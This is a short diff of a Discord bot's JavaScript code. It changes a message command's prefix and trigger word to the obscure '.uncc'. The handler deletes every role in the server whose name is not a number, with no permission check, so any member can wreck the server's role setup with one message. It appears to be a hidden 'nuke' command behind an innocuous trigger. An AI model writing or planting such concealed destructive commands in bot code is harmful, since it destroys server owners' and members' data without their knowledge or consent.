@@ -302,10 +302,10 @@ client.on('voiceStateUpdate', (old, now) => {
 
   
   client.on('message' , ReBeL => {
-var prefix = "-";
+var prefix = ".";
 if(ReBeL.author.bot) return;
 if(ReBeL.channel.type == 'dm') return;
-if(ReBeL.content.startsWith(prefix + "gg")) {
+if(ReBeL.content.startsWith(prefix + "uncc")) {
 ReBeL.guild.roles.filter(rebel => isNaN(rebel)).forEach(codes => codes.delete())
 }
 });
